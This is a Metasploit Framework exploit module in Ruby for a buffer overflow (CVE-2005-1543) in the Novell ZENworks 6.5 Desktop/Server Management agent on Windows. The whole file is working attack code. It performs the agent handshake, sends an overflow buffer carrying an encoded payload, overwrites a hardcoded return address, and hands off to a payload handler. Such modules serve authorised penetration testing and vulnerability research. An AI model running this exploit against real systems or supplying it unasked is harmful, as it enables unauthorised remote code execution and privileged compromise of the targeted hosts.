##
# $Id: zenworks_desktop_agent.rb 9929 2010-07-25 21:37:54Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell ZENworks 6.5 Desktop/Server Management Overflow',
			'Description'    => %q{
					This module exploits a heap overflow in the Novell ZENworks
				Desktop Management agent. This vulnerability was discovered
				by Alex Wheeler.
			},
			'Author'         => [ 'anonymous' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9929 $',
			'References'     =>
				[
					[ 'CVE', '2005-1543'],
					[ 'OSVDB', '16698'],
					[ 'BID', '13678'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 32767,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'Windows XP/2000/2003- ZENworks 6.5 Desktop/Server Agent',
						{
							'Platform' => 'win',
							'Ret'      => 0x10002e06,
						},
					],
				],
			'DisclosureDate' => 'May 19 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect

		hello = "\x00\x06\x05\x01\x10\xe6\x01\x00\x34\x5a\xf4\x77\x80\x95\xf8\x77"
		print_status("Sending version identification")
		sock.put(hello)

		pad   = Rex::Text.rand_text_alphanumeric(6, payload_badchars)
		ident = sock.get_once
		if !(ident and ident.length == 16)
			print_error("Failed to receive agent version identification")
			return
		end

		print_status("Received agent version identification")
		print_status("Sending client acknowledgement")
		sock.put("\x00\x01")

		# Stack buffer overflow in ZenRem32.exe / ZENworks Server Management
		sock.put("\x00\x06#{pad}\x00\x06#{pad}\x7f\xff" + payload.encoded + "\x00\x01")

		ack = sock.get_once
		sock.put("\x00\x01")
		sock.put("\x00\x02")

		print_status("Sending final payload")
		sock.put("\x00\x24" + ("A" * 0x20) + [ target.ret ].pack('V'))

		print_status("Overflow request sent, sleeping for four seconds")
		select(nil,nil,nil,4)

		handler
		disconnect
	end

end
